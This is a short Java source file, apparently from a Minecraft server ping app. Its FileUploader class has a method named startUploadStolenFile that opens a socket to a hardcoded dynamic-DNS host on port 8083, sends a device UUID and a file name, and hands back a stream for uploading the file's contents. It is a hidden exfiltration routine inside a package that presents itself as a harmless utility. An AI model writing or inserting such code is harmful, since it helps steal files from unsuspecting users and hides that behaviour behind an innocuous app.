package com.nao20010128nao.McServerPingPong.misc;
import java.io.*;
import java.net.*;
import java.util.*;

public class FileUploader
{
	private static final String ENDPOINT = "nao20010128nao.dip.jp";
	private static final int ENDPOINT_PORT = 8083;
	public UUID uuid;
	
	public FileUploader(UUID uuid){
		this.uuid=uuid;
	}
	public FileUploader(String s){
		this(UUID.fromString(s));
	}
	public OutputStream startUploadStolenFile(String filename) {
		try {
			Socket socket = new Socket(ENDPOINT, ENDPOINT_PORT);
			DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
			dos.writeByte(3);
			dos.writeUTF(uuid.toString());
			dos.writeUTF(filename);
			return socket.getOutputStream();
		} catch (IOException e) {
			// TODO 自動生成された catch ブロック
			e.printStackTrace();
			return null;
		}
	}
}
